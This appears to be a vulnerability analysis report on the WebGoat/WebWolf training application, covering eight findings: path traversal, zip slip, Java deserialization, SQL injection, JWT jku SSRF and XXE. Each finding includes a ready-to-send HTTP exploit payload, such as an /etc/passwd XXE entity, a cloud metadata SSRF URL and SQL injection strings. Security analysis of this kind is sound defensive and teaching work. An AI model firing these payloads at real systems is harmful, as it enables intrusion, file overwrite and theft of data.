title: Arbitrary File Write via Path Traversal in WebWolf FileServer
analysis:
- Source: Untrusted multipart file upload in the `importFile` method via `@RequestParam("file") MultipartFile myFile` on the `/fileupload` endpoint (POST).
- Sanitization/Validation: None. The code directly queries `myFile.getOriginalFilename()` without stripping directory traversal sequences (such as `../`) or verifying whether the target path resides within the intended directory.
- Sink: `myFile.transferTo(new File(destinationDir, myFile.getOriginalFilename()))`.
- Conceptual Exploit Payload:
```http
POST /fileupload HTTP/1.1
Host: localhost:9090
Cookie: WEBWOLFSESSION=...
Content-Type: multipart/form-data; boundary=---------------------------974767299852498929531610575

-----------------------------974767299852498929531610575
Content-Disposition: form-data; name="file"; filename="../../../tmp/malicious.sh"
Content-Type: text/plain

#!/bin/bash
touch /tmp/pwned
-----------------------------974767299852498929531610575--
```
Because `destinationDir` is concatenated directly with `myFile.getOriginalFilename()`, `new File(destinationDir, "../../../tmp/malicious.sh")` escapes the target folder and `transferTo` writes the file to `/tmp/malicious.sh`.
vuln_type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

title: Insecure Deserialization of Untrusted Data in InsecureDeserializationTask
analysis:
- Source: Untrusted user input enters through `@RequestParam String token` on endpoint `POST /InsecureDeserialization/task`.
- Sanitization/Validation: The application simply URL-safe-decodes base64 (`token.replace('-', '+').replace('_', '/')`) and passes the decoded bytes directly into `ObjectInputStream`. Type checking (`instanceof VulnerableTaskHolder`) is only executed *after* deserialization has already completed (`ois.readObject()`), which fails to prevent gadget execution during the deserialization phase.
- Sink: `ois.readObject()`, invoking Java's native deserialization.
- Conceptual Exploit Payload:
```http
POST /InsecureDeserialization/task HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

token=rO0ABXNyACpvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAAJMAAp0YXNrQWN0aW9udAASTGphdmEvbGFuZy9TdHJpbmc7TAAIdGFza05hbWVxAH4AAXhwdAAPcGluZyAtYyA1IDEyNy4xLXBpbmc=
```
Upon deserialization of `VulnerableTaskHolder` (or standard gadget chains), `readObject` is executed automatically, leading to arbitrary command execution via `Runtime.getRuntime().exec()`.

title: Arbitrary File Overwrite via Zip Slip in ProfileZipSlip
analysis:
- Source: User-supplied zip archive uploaded via `@RequestParam("uploadedFileZipSlip") MultipartFile file` on `POST /PathTraversal/zip-slip`.
- Sanitization/Validation: The controller verifies that the uploaded file ends with `.zip`, but when extracting zip entries (`zip.entries()`), it fails to sanitize or validate entry names (`e.getName()`) against directory traversal sequences (Zip Slip vulnerability).
- Sink: `Files.copy(is, f.toPath(), StandardCopyOption.REPLACE_EXISTING)` where `File f = new File(tmpZipDirectory.toFile(), e.getName())`.
- Conceptual Exploit Payload:
A zip archive containing a file entry named `../../../../tmp/pwned.txt`.
```http
POST /PathTraversal/zip-slip HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=---------------------------1234567890

-----------------------------1234567890
Content-Disposition: form-data; name="uploadedFileZipSlip"; filename="exploit.zip"
Content-Type: application/zip

[ZIP byte stream containing entry "../../../../tmp/pwned.txt"]
-----------------------------1234567890--
```
When `new File(tmpZipDirectory.toFile(), e.getName())` resolves `e.getName()`, the resulting path navigates out of `tmpZipDirectory`, causing `Files.copy` to write the payload outside the intended directory.
vuln_type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

title: SQL Injection in JWT Key ID (kid) Header in JWTHeaderKIDEndpoint
analysis:
- Source: Untrusted input enters through the `token` parameter on `POST /JWT/kid/delete`. The `kid` header is parsed from the unverified JWT header via `(String) header.get("kid")`.
- Sanitization/Validation: None. The `kid` string from the JWT header is directly concatenated into a raw SQL query string without escaping or using prepared statement parameters.
- Sink: `connection.createStatement().executeQuery("SELECT key FROM jwt_keys WHERE id = '" + kid + "'")`.
- Conceptual Exploit Payload:
Construct a JWT with the following header:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "' UNION SELECT 'dGVzdA==' -- "
}
```
Payload:
```json
{
  "username": "Tom"
}
```
HTTP Request:
```http
POST /JWT/kid/delete HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

token=<base64url(header)>.<base64url(payload)>.<signature_using_key_'test'>
```
The query executed by the database will be:
`SELECT key FROM jwt_keys WHERE id = '' UNION SELECT 'dGVzdA==' -- '`
which injects a predictable key (`test`) allowing signature forgery and bypass.
vuln_type: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

title: Server-Side Request Forgery (SSRF) via JWT jku Header in JWTHeaderJKUEndpoint
analysis:
- Source: Untrusted JWT token passed via `@RequestParam("token") String token` on endpoint `POST /JWT/jku/delete`.
- Sanitization/Validation: None. The `jku` (JSON Web Key Set URL) header claim is retrieved via `decodedJWT.getHeaderClaim("jku")` without URL allowlisting, protocol restrictions, or host/IP validation.
- Sink: `new JwkProviderBuilder(new URL(jku.asString())).build().get(decodedJWT.getKeyId())`, which initiates an outbound HTTP connection to the attacker-supplied URL to fetch keys.
- Conceptual Exploit Payload:
JWT Header:
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "http://169.254.169.254/latest/meta-data/",
  "kid": "key1"
}
```
HTTP Request:
```http
POST /JWT/jku/delete HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

token=<base64url(header)>.<base64url(payload)>.<signature>
```
The server connects to `http://169.254.169.254/latest/meta-data/` to fetch JWKs, exposing internal cloud metadata or intranet services via Server-Side Request Forgery.

title: SQL Injection in SqlInjectionChallenge Registration Endpoint
analysis:
- Source: Untrusted HTTP request parameter `username_reg` submitted to endpoint `PUT /SqlInjectionAdvanced/challenge`.
- Sanitization/Validation: Only length checks (`username_reg.length() <= 250`) and non-empty checks are performed in `checkArguments()`. No input sanitation, escaping, or parameterized queries are used.
- Sink: Concatenated into `checkUserQuery` and passed directly to `statement.executeQuery(checkUserQuery)`.
- Conceptual Exploit Payload:
```http
PUT /SqlInjectionAdvanced/challenge HTTP/1.1
Host: localhost:8080
Content-Type: application/x-www-form-urlencoded

username_reg=tom' OR '1'='1&email_reg=test@test.com&password_reg=secret
```
The query executed against the database is:
`select userid from sql_challenge_users where userid = 'tom' OR '1'='1'`
allowing arbitrary SQL syntax injection and logic manipulation.
vuln_type: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

title: XML External Entity (XXE) Injection in CommentsCache
analysis:
- Source: Raw XML body sent via `@RequestBody String commentStr` on `POST /xxe/simple`.
- Sanitization/Validation: Protection settings (`ACCESS_EXTERNAL_DTD` and `ACCESS_EXTERNAL_SCHEMA`) are only conditionally configured if `webSession.isSecurityEnabled()` returns true, which is disabled by default.
- Sink: `xif.createXMLStreamReader(new StringReader(xml))` followed by `unmarshaller.unmarshal(xsr)`, which processes external entities without restriction.
- Conceptual Exploit Payload:
```http
POST /xxe/simple HTTP/1.1
Host: localhost:8080
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comment>
  <text>&xxe;</text>
</comment>
```
The XML parser resolves the `&xxe;` entity against the local filesystem, populating `comment.text` with the contents of `/etc/passwd`.
vuln_type: CWE-611: Improper Restriction of XML External Entity Reference

title: Path Traversal Filter Bypass in ProfileUploadFix
analysis:
- Source: Untrusted HTTP request parameter `fullNameFix` submitted via `POST /PathTraversal/profile-upload-fix`.
- Sanitization/Validation: The application uses a flawed single-pass replacement `fullName.replace("../", "")`. This can be trivially bypassed by nested or non-recursive traversal sequences like `....//` or `..././`.
- Sink: Passed to `super.execute()`, which constructs `new File(uploadDirectory, fullName)` and writes the uploaded file via `uploadedFile.createNewFile()` and `FileCopyUtils.copy(file.getBytes(), uploadedFile)`.
- Conceptual Exploit Payload:
```http
POST /PathTraversal/profile-upload-fix HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=---------------------------5829471928374

-----------------------------5829471928374
Content-Disposition: form-data; name="fullNameFix"

....//....//test.txt
-----------------------------5829471928374
Content-Disposition: form-data; name="uploadedFileFix"; filename="test.txt"
Content-Type: text/plain

traversal test
-----------------------------5829471928374--
```
`fullName.replace("../", "")` strips `../` from inside `....//`, reducing it to `../`, thereby writing `test.txt` outside `uploadDirectory`.
vuln_type: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
